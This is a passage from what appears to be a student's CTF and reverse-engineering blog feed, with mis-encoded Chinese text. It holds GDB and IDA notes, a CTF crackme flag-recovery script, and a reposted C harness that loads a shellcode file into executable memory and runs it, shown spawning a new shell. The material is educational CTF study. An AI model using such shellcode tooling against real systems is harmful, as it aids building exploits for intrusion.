count);<br>read(a,buf,c)<br>æ‰“å¼€æ–‡ä»¶aï¼Œè¯»å–cä¸ªå­—èŠ‚ï¼Œå­˜åˆ°bufä¸­<br>è¿”å›å®é™…è¯»åˆ°çš„å­—èŠ‚æ•°ã€‚å¦‚æœå‡ºé”™ è¿”å›-1</p><p>read(0,&amp;buf,4u)</p><p>ä»shellè¯»å–4uåˆ°bufä¸­</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>19/9/20ç¬”è®°</title>
    <link href="/2019/11/29/19920%E7%AC%94%E8%AE%B0/"/>
    <url>/2019/11/29/19920%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="é€†å‘ç¬”è®°"><a href="#é€†å‘ç¬”è®°" class="headerlink" title="é€†å‘ç¬”è®°"></a>é€†å‘ç¬”è®°</h1><p>PEæ˜¯windowsä¸‹çš„æ–‡ä»¶ï¼ŒELFæ˜¯linux/unixä¸‹çš„æ–‡ä»¶</p><p>packerå£³</p><p>28537194573619560LL LL-&gt;é•¿é•¿æ•´å‹</p><p>å¯åœ¨æ±‡ç¼–è¯­è¨€ä¸­å¯»æ‰¾åˆ°mov rax ï¼ŒæŒ‡é’ˆ æ²¿ç€æŒ‡é’ˆ å†æŒ‰Rçœ‹è½¬æ¢åçš„å†…å®¹ï¼ˆç”±äºä½å°¾ç«¯ï¼Œæ ˆåœ°å€å‘ä½åœ°å€æ‰©å±•ï¼Œæ‰€ä»¥è¦å°†å­—ç¬¦ä¸²åè¿‡æ¥ï¼‰</p><h2 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h2><p>b å‡½æ•°å</p><blockquote><p>ä¸‹æ–­ç‚¹breakpoint</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">&gt;<span class="hljs-keyword">b </span>__libc_start_main <span class="hljs-comment">#åœ¨ä¸»å‡½æ•°è®¾ç½®æ–­ç‚¹</span><br></code></pre></td></tr></table></figure></blockquote><p>set</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">set</span> <span class="hljs-variable">$eip</span>=åœ°å€ #è·³è½¬åˆ°æŸå‡½æ•°åœ°å€<br><span class="hljs-builtin-name">set</span> <span class="hljs-variable">$eip</span>=0x0804849b<br></code></pre></td></tr></table></figure><p>r</p><blockquote><p>run è¿è¡Œåˆ°æˆ‘ä»¬ä¸‹æ–­ç‚¹çš„åœ°æ–¹ï¼Œåœæ­¢</p></blockquote><p>n</p><blockquote><p>è¿è¡Œä¸€æ­¥</p></blockquote><p>x/200wx $å¯„å­˜å™¨</p><blockquote><p>x:å°±æ˜¯ç”¨æ¥æŸ¥çœ‹å†…å­˜ä¸­æ•°å€¼çš„ï¼Œåé¢çš„200ä»£è¡¨æŸ¥çœ‹å¤šå°‘ä¸ªï¼Œwxä»£è¡¨æ˜¯ä»¥wordå­—èŠ‚æŸ¥çœ‹çœ‹ï¼Œ$eaxä»£è¡¨çš„eaxå¯„å­˜å™¨ä¸­çš„å€¼</p></blockquote><h2 id="åç¼–è¯‘pyc"><a href="#åç¼–è¯‘pyc" class="headerlink" title="åç¼–è¯‘pyc"></a>åç¼–è¯‘pyc</h2><blockquote><p>uncompyle2 -h</p></blockquote><p>==md5(md5($pass)) ï¼šç¬¬ä¸€æ¬¡åŠ å¯†åï¼Œç»“æœè½¬æ¢æˆå°å†™ï¼Œå¯¹ç»“æœå†åŠ å¯†ä¸€æ¬¡.è§£å¯†ä¸ºï¼šè§£å¯†ä¸€æ¬¡åï¼Œå†è§£å¯†ä¸€æ¬¡==</p><img src="/2019/11/29/19920%E7%AC%94%E8%AE%B0/image-20190820013756861.png" class="" title="image-20190820013756861"><blockquote><p>Re2-cpp-is-awesome</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> ( a1 != <span class="hljs-number">2</span> )<br>  &#123;<br>    v3 = *a2;<br>    v4 = std::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;(&amp;std::cout, <span class="hljs-string">&quot;Usage: &quot;</span>, a3);<br>    v6 = std::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;(v4, v3, v5);<br>    std::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;(v6, <span class="hljs-string">&quot; flag\n&quot;</span>, v7);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;                                             <span class="hljs-comment">// æ£€æµ‹è¾“å…¥</span><br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt;::<span class="hljs-built_in">allocator</span>(&amp;v13, a2, a3);<br>  std::__cxx11::basic_string&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;,std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;::<span class="hljs-built_in">basic_string</span>(&amp;v12, a2[<span class="hljs-number">1</span>], &amp;v13);<br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt;::~<span class="hljs-built_in">allocator</span>(&amp;v13);<br>  v15 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> ( i = std::__cxx11::basic_string&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;,std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;::<span class="hljs-built_in">begin</span>(&amp;v12); ; <span class="hljs-built_in">iplusplus</span>(&amp;i) )<br>  &#123;<br>    v14 = std::__cxx11::basic_string&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;,std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;::<span class="hljs-built_in">end</span>(&amp;v12);<br>    <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">iNotEqualV14</span>((__int64)&amp;i, (__int64)&amp;v14) )<br>      <span class="hljs-keyword">break</span>;<br>    v9 = *(<span class="hljs-keyword">unsigned</span> __int8 *)<span class="hljs-built_in">thesame</span>((__int64)&amp;i);<br>    <span class="hljs-keyword">if</span> ( (_BYTE)v9 != originalKey[Number[v15]] )<span class="hljs-comment">//key</span><br>      <span class="hljs-built_in">betterLuckNextTime</span>((__int64)&amp;i, (__int64)&amp;v14, v9);<br>    ++v15;<br>  &#125;<br>  <span class="hljs-built_in">coutShouldHaveFlagNow</span>((__int64)&amp;i, (__int64)&amp;v14, v8);<br>  std::__cxx11::basic_string&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;,std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;::~<span class="hljs-built_in">basic_string</span>(&amp;v12);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">key = <span class="hljs-string">&#x27;L3t_ME_T3ll_Y0u_S0m3th1ng_1mp0rtant_A_&#123;FL4G&#125;_W0nt_b3_3X4ctly_th4t_345y_t0_c4ptur3_H0wev3r_1T_w1ll_b3_C00l_1F_Y0u_g0t_1t&#x27;</span><br>dump = [<span class="hljs-number">0x24</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x05</span>,<span class="hljs-number">0x36</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x07</span>,<span class="hljs-number">0x27</span>,<span class="hljs-number">0x26</span>,<span class="hljs-number">0x2D</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x03</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x0D</span>,<span class="hljs-number">0x56</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x03</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x03</span>,<span class="hljs-number">0x2D</span>,<span class="hljs-number">0x16</span>,<span class="hljs-number">0x02</span>,<span class="hljs-number">0x15</span>,<span class="hljs-number">0x03</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x29</span><br>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x2B</span>]<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> dump:<br>    flag +=key[i]<br><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><img src="/2019/11/29/19920%E7%AC%94%E8%AE%B0/image-20190820143248918.png" class="" title="image-20190820143248918"><p>è®°å¾—å…¨éƒ½è¦å†™ä¸‹æ¥ï¼ŒåŒ…æ‹¬0</p><hr><img src="/2019/11/29/19920%E7%AC%94%E8%AE%B0/image-20190821163335042.png" class="" title="image-20190821163335042"><p>ä¸æ­¢å¯èƒ½æ˜¯ä¿å­˜ï¼Œè¿˜æœ‰å¯èƒ½è¯»å–æ–‡æœ¬ä¸­çš„å­—ç¬¦ä¸²ä¸ç¨‹åºé‡Œçš„å¯¹æ¯”</p><hr><p>IDA </p><p>å¿«æ·é”®Y è¾“å…¥ char a[0xå¤§å°] å°±å¯ä»¥è‡ªåŠ¨è½¬æˆå­—ç¬¦ä¸²</p><p>æ±‡ç¼–çš„æ¡ä»¶è·³è½¬æŒ‡ä»¤:</p><p>â€‹      jmp :æ— æ¡ä»¶è·³è½¬ (jump)</p><p>â€‹      je/jz :ç»“æœä¸º0è·³è½¬ (jump zero)</p><p>â€‹      jnz/jne: ç»“æœä¸ä¸º0è·³è½¬ (jump not zero)</p><p>â€‹      js:ç»“æœä¸ºè´Ÿè·³è½¬ (Jump if sign)</p><p>â€‹      jns:ç»“æœä¸ºæ­£è·³è½¬(Jump if not sign)</p><p>â€‹      jb:å°äºåˆ™è·³è½¬ï¼ˆJump belowï¼‰</p><p>â€‹     jnb:å¤§äºæˆ–ç­‰äºåˆ™è·³è½¬(Jump not below)</p><p><a href="https://www.jianshu.com/p/dc3f6437c108">è¿ç”¨Zæ¥ä½¿å¾—ç¨‹åºæŒ‰ç…§è‡ªå·±æƒ³æ³•æ‰§è¡Œ</a></p><img src="/2019/11/29/19920%E7%AC%94%E8%AE%B0/image-20190830134741936.png" class="" title="image-20190830134741936"><hr><h3 id="å¤§å°ç«¯ï¼ï¼ï¼ï¼ï¼ï¼"><a href="#å¤§å°ç«¯ï¼ï¼ï¼ï¼ï¼ï¼" class="headerlink" title="å¤§å°ç«¯ï¼ï¼ï¼ï¼ï¼ï¼"></a>å¤§å°ç«¯ï¼ï¼ï¼ï¼ï¼ï¼</h3><img src="/2019/11/29/19920%E7%AC%94%E8%AE%B0/image-20190822204713754.png" class="" title="image-20190822204713754"><p>mercedes!!!!</p><hr><img src="/2019/11/29/19920%E7%AC%94%E8%AE%B0/image-20190826101318562.png" class="" title="image-20190826101318562"><p>æœç´¢å­—ç¬¦ä¸²</p><img src="/2019/11/29/19920%E7%AC%94%E8%AE%B0/image-20190826101343642.png" class="" title="image-20190826101343642"><p>åŒå‡»flagå¯æ‰¾åˆ°ä½¿ç”¨åœ°å€</p><p>ç»§ç»­åŒå‡»DATA XREFåé¢çš„ä¿¡æ¯å¯è·³è½¬åˆ°å‘½ä»¤èµ·å§‹åœ°å€</p><hr><p>é“¾è¡¨<a href="https://www.jianshu.com/p/7779f3e83384">https://www.jianshu.com/p/7779f3e83384</a></p><p><a href="https://www.cnblogs.com/ha2ha2/p/7943339.html">https://www.cnblogs.com/ha2ha2/p/7943339.html</a></p><hr><p>ext3</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gradle">mount filename <span class="hljs-regexp">/mnt/</span><br>cd <span class="hljs-regexp">/mnt/</span><br><span class="hljs-keyword">find</span> | <span class="hljs-keyword">grep</span> <span class="hljs-string">&#x27;flag&#x27;</span><br></code></pre></td></tr></table></figure><hr><p>kali</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pdftotext</span> filename.pdf <span class="hljs-number">1</span>.txt<br></code></pre></td></tr></table></figure><hr><h2 id="éšå†™"><a href="#éšå†™" class="headerlink" title="éšå†™"></a>éšå†™</h2><p>ç”¨chromeæ‰“å¼€pdf å¤åˆ¶æ‰€æœ‰å­—ç¬¦ A.B-</p><p>é€å¸§æŸ¥çœ‹ï¼Œæˆ–è€…ä½¿ç”¨stegslove</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>What a day</title>
    <link href="/2019/11/19/What%20a%20day/"/>
    <url>/2019/11/19/What%20a%20day/</url>
    
    <content type="html"><![CDATA[<p>æ˜æ˜è¯´è¦è°ƒæ•´ä½œæ¯çš„ï¼Œç»“æœå¤´ç–¼æ™šä¸Šç¡äº†ä¼šï¼Œç°åœ¨ä¸€ç‚¹éƒ½ä¸å›°äº†ã€‚ã€‚ã€‚ã€‚</p><h2 id="æƒ³å­¦é€†å‘"><a href="#æƒ³å­¦é€†å‘" class="headerlink" title="æƒ³å­¦é€†å‘"></a>æƒ³å­¦é€†å‘</h2><p>å‘ç°äº†macä¸Šçš„ä¸€äº›è½¯ä»¶ä¹‹ç±»çš„ï¼Œ<a href="https://www.jianshu.com/p/c04ac36c6641?tdsourcetag=s_pctim_aiomsg">link</a></p><p>å…¥é—¨<a href="https://blog.csdn.net/qq_21508727/article/details/80559270">link</a></p><p>pwnå­¦ä¹ æµç¨‹<br>â€“ [ ] å°ç”²é±¼è§†é¢‘<br>â€“ [ ] liveoverflowé‚£ä¸€å¥—è§†é¢‘å…¥é—¨<br>â€“ [ ] Ctfwikiï¼Œæ¯ç§ç±»å‹ä¾‹é¢˜è·Ÿç€åšä¸€éï¼Œrealworldå°±æ¼æ´æˆ˜äº‰ï¼Œgoogle project zeroåšå®¢ä¹‹ç±»çš„<br>â€“ [ ] æ ˆç®€å•æ±‡ç¼–å°±è¡Œï¼Œå †è¦å»çœ‹linuxæºç ,Mallocå’Œfreeéƒ¨åˆ†,å¸¸è§çš„dlmallocå’Œptmalloc,è¿˜æœ‰fastbinsï¼Œglibc2.26ä¹‹åæ˜¯trachebinsï¼Œæ‰€ä»¥è¿˜è¦çœ‹ä¸åŒç‰ˆæœ¬çš„æºç </p><h2 id="åœ¨çº¿ctfå¹³å°"><a href="#åœ¨çº¿ctfå¹³å°" class="headerlink" title="åœ¨çº¿ctfå¹³å°"></a>åœ¨çº¿ctfå¹³å°</h2><p><a href="https://i.loli.net/2019/08/06/Jht7r9DY4xadcQZ.png">![ctfå¹³å°](What a day/Jht7r9DY4xadcQZ.png)</a></p><p>ä¸‹é‚£ä¹ˆå¤šæ¸¸æˆå°±ä¸ºäº†ä¸€èµ·ç©å˜›ã€‚ã€‚ã€‚è¿™æ ·å§ï¼Œç­‰æˆ˜é›·ä¼šå‘˜è¿‡æœŸäº†å°±åˆ äº†å§ã€‚å—¯</p><h1 id="GOGOGOï¼"><a href="#GOGOGOï¼" class="headerlink" title="GOGOGOï¼"></a>GOGOGOï¼</h1><h1 id="è¿‡å‡ å¤©é‡æ–°å¼€å§‹ä¸€å¤§æ—©èµ·åºŠè·‘æ­¥å§"><a href="#è¿‡å‡ å¤©é‡æ–°å¼€å§‹ä¸€å¤§æ—©èµ·åºŠè·‘æ­¥å§" class="headerlink" title="è¿‡å‡ å¤©é‡æ–°å¼€å§‹ä¸€å¤§æ—©èµ·åºŠè·‘æ­¥å§!"></a>è¿‡å‡ å¤©é‡æ–°å¼€å§‹ä¸€å¤§æ—©èµ·åºŠè·‘æ­¥å§!</h1>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>è½¬è½½-ç¼–å†™shellcodeæµ‹è¯•å·¥å…·</title>
    <link href="/2019/11/19/%E7%BC%96%E5%86%99shellcode%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/"/>
    <url>/2019/11/19/%E7%BC%96%E5%86%99shellcode%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/</url>
    
    <content type="html"><![CDATA[<p>ä¸çŸ¥ä¸è§‰ï¼Œshellcodeå·²æˆåŠŸæ”»å‡»è¿‡ç¨‹ä¸­å¿…ä¸å¯å°‘çš„æ­¥éª¤ï¼Œåé¢çš„æ–‡ç« ä¼šç»§ç»­ä»‹ç»å¦‚ä½•ç¼–å†™å…¶å®ƒç±»å‹çš„shellcodeã€‚ç›´åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæ¯æ¬¡å®Œshellcodeæ±‡ç¼–ä»£ç ï¼Œéƒ½éœ€è¦æ‰¾åˆ°ä¹‹å‰ï¼ˆæˆ–è€…é‡æ–°ç¼–å†™ï¼‰å¸¦ç¼“å†²åŒºæº¢å‡ºæ¼æ´çš„ä»£ç è¿›è¡Œæµ‹è¯•ï¼ŒåŒæ—¶è¦ä¸åœåœ°å¯¹å‡†EIPä»¥åŠespåœ°å€ã€‚è¿™å¯¹äºæµ‹è¯•shellcodeçš„æ­£ç¡®æ€§æ¥è¯´ï¼Œå¾ˆä¸æ–¹ä¾¿ï¼Œä¹Ÿéš¾ä»¥è°ƒè¯•ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬å…ˆç¼–å†™shellcodeæµ‹è¯•å·¥å…·ï¼Œæ–¹ä¾¿åé¢æµ‹è¯•shellcodeï¼Œæ‰€è°“ç£¨åˆ€ä¸è¯¯ç æŸ´åŠŸã€‚</p><p>shellcodeæµ‹è¯•å·¥å…·sctest<br>æˆ‘ä»¬å°†å·¥å…·å–åä¸ºsctestï¼Œæ˜¯shell code testçš„ç¼©å†™ã€‚<br>å‘½ä»¤ç”¨æ³•ï¼šsctest  &lt;shellcodeäºŒè¿›åˆ¶æ–‡ä»¶&gt;</p><p>è¯¥ç¨‹åºçš„å®ç°å¾ˆç®€å•ï¼š</p><p>1ï¼‰ è¯»shellcode äºŒè¿›åˆ¶è¯»åˆ°å†…å­˜<br>2ï¼‰å°†è£…è½½shellcodeå†…å­˜çš„å±æ€§å˜æˆå¯æ‰§è¡Œ<br>3ï¼‰è·³åˆ°è¯¥shellcodeæ‰§è¡Œ</p><p>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-keyword">char</span> code[<span class="hljs-number">4096</span>] __attribute__((aligned(<span class="hljs-number">4096</span>)));<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> fd;<br>    <span class="hljs-keyword">int</span> ret;<br>    <span class="hljs-keyword">void</span> (*func)(<span class="hljs-keyword">void</span>);<br><span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>) &#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n\tUsage: sctest &lt;shellcode&gt;\n\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br> <br>fd = open(argv[<span class="hljs-number">1</span>], O_RDONLY);<br><span class="hljs-keyword">if</span> (!fd) &#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Unable open file %s, err = %d(%m)\n&quot;</span>, argv[<span class="hljs-number">1</span>], errno);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<br>&#125;<br> <br>ret = read(fd, code, <span class="hljs-keyword">sizeof</span>(code));<br><span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Unable read file %s, err = %d(%m)\n&quot;</span>, argv[<span class="hljs-number">1</span>], errno);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">3</span>;<br>&#125;<br> <br>ret = mprotect(code, <span class="hljs-keyword">sizeof</span>(code), PROT_EXEC);<br><span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Unable mprotect, err = %d(%m)\n&quot;</span>, errno);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">4</span>;<br>&#125;<br> <br><span class="hljs-comment">/* execute shell code */</span><br>func = (<span class="hljs-keyword">void</span> (*)(<span class="hljs-keyword">void</span>))code;<br>func();<br><span class="hljs-built_in">abort</span>();  <br>&#125;<br></code></pre></td></tr></table></figure><p>ç¼–è¯‘<br>åˆ°ç›®å‰ä¸ºæ­¢ï¼Œshellcodeçš„è¿è¡Œç¯å¢ƒéƒ½æ˜¯32ä½åº”ç”¨ç¨‹åºï¼Œä»¥åæ¶‰åŠ64ä½åº”ç”¨ç¨‹åºï¼›ç”±äºåŒä¸€ç¨‹åºä¸èƒ½æ··æ­32å’Œ64ä½æŒ‡ä»¤ï¼Œå› æ­¤éœ€è¦ç¼–è¯‘ä¸¤ä¸ªå·¥å…·ï¼ˆ32ä½å’Œ64ä½ï¼‰</p><p>$ gcc -Wall -g -o sctest32 sctest.c -m32<br>$ gcc -Wall -g -o sctest sctest.c</p><p>æµ‹è¯•ä»¥å‰çš„shellcode</p><p>ä¸Šç¯‡æ–‡ç« ä¸­ï¼Œä»‹ç»å¦‚ä½•ç¼–å†™æœ¬åœ°shellcodeï¼Œä½¿ç”¨sctest32å·¥å…·å¯¹å®ƒè¿›è¡Œæµ‹è¯•ï¼š</p><p>å½“å‰ bashçš„pid</p><p>$ echo $$<br>2180</p><p>æµ‹è¯•shellcode<br>ivan@ivan:~/exploit/tools$ ./sctest32 ../shell2</p><p>è¿è¡Œshellcodeåshçš„pid<br>$ echo $$<br>3178</p><p>ä¸¤ä¸ªpidä¸ä¸€æ ·ï¼Œè¯´æ˜ shell2æˆåŠŸå¯åŠ¨äº†ä¸€ä¸ªæ–°sh</p><p>åœ¨åé¢çš„shellcodeä»‹ç»ä¸­ï¼Œæˆ‘ä»¬ä¼šä½¿ç”¨sctest32/sctestå·¥å…·è¿›è¡Œç‹¬ç«‹æµ‹è¯•ï¼Œä¸ä¾èµ–äºæ¼æ´ä»£ç ã€‚</p><hr><p>ç‰ˆæƒå£°æ˜ï¼šæœ¬æ–‡ä¸ºCSDNåšä¸»ã€Œæµ·æ«ã€çš„åŸåˆ›æ–‡ç« ï¼Œéµå¾ª CC 4.0 BY-SA ç‰ˆæƒåè®®ï¼Œè½¬è½½è¯·é™„ä¸ŠåŸæ–‡å‡ºå¤„é“¾æ¥åŠæœ¬å£°æ˜ã€‚<br>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/linyt/article/details/43538837">https://blog.csdn.net/linyt/article/details/43538837</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World!</title>
    <link href="/2019/11/19/hello-world/"/>
    <url>/2019/11/19/hello-world/</url>
    
    <content type="html"><![CDATA[<p>2019/8/3æ—¥ 15ï¼š22ï¼Œæˆ‘çš„ç½‘ç«™ç®—æ˜¯æ­£å¼å¼€é€šäº†ã€‚è¿™é‡Œå¯èƒ½æ˜¯æˆ‘å±•ç°æœ€çœŸå®çš„æˆ‘çš„åœ°æ–¹ï¼Œä¹Ÿç”¨æ¥è®°å½•æˆ‘çš„å­¦ä¹ è¿‡ç¨‹å’Œå­¦ä¹ èµ„æ–™ã€‚åœ¨æ­¤å…ˆæ„Ÿè°¢ä¸€ä¸‹æ¯›åŒå­¦çš„å¤§åŠ›é¼“å¹ï¼Œè®©æˆ‘æäº†è¿™ä¸ªï¼Œä¹Ÿæ„Ÿè°¢æˆ‘çš„å­¦æ ¡ç»™æˆ‘æŠ¥é”€ï¼ˆç¬‘</p><p>æœ€è¿‘åœ¨å­¦æ ¡çš„å¤§æ•°æ®ç­å­¦ä¹ äº†åœ¨centOSæ­å»ºhadoopå¹³å°ï¼ˆä½¿ç”¨javaè¿›è¡Œç¨‹åºç¼–å†™ï¼‰ï¼Œæœ€å¼€å§‹çš„æ˜¯è®¡ç®—å’Œç®¡ç†éƒ½åœ¨ä¸€ä¸ªæ¨¡æ‹Ÿæœºé‡Œçš„ä¼ªåˆ†å¸ƒå¼ï¼Œä¸€ä¸»ä¸€ä»†çš„ä¹Ÿåœ¨å›å®¶ååœ¨è‡ªå®¶ç”µè„‘ä¸Šå®Œæˆäº†æ­å»ºã€‚</p><p>åæ¥ä¸ºäº†ægithubå’Œgiteeå¤‡ä»½ä»£ç ï¼Œåˆå»ç ”ç©¶äº†gitå¦‚ä½•ä½¿ç”¨ï¼Œä»¥åŠåœ¨vscodeé‡ŒåŒæ­¥ä»£ç ï¼Œç°åœ¨ä¹Ÿæ˜¯å¯ä»¥å•¦~ç‚¹è¿™å¯ä»¥çœ‹ ç›¸å…³ä»£ç å’Œæ“ä½œ</p><p>ä¸ºäº†åœ¨å­¦æ ¡æ›´å¥½çš„æ•²ä»£ç ï¼ˆè£…é€¼ï¼‰ï¼Œä¹Ÿæ˜¯æ‰“ç®—ä¹°ä¸€ä¸ªè±†å­å³¡è°·ï¼Œè£…ä¸Šé»‘è‹¹æœå’ŒcentOSï¼Œå¹³æ—¶ç”¨é»‘è‹¹æœå’Œæˆ‘çš„surfaceï¼Œè®¡ç®—æ—¶å°±ç”¨centOSã€‚ä¸å¾—ä¸è¯´i58259Uè¿™ä¸œè¥¿å¥½åƒæŒºå¼ºçš„ï¼Œ2/3ä¸ª8700kï¼Œå¯¹æ¯”i7 8559uå·®è·ä¹Ÿä¸å¤§ã€‚</p><p>ä»Šå¤©ä¹Ÿå¼€å§‹äº†DVWAçš„å­¦ä¹ ï¼Œå­¦ä¹ ä½¿ç”¨kaliï¼Œï¼ˆè™½ç„¶ä»Šæ—©ä¹Ÿæ²¡æå¤šå°‘ã€‚ã€‚å¥½åƒå°±æäº†ä¸ªBrup Forceï¼Œè¿Brup Suiteçš„çˆ†ç ´ä¹Ÿæ²¡å®Œå…¨å¼„æ‡‚å’‹æã€‚ã€‚</p><p>å°±å…ˆè¿™æ 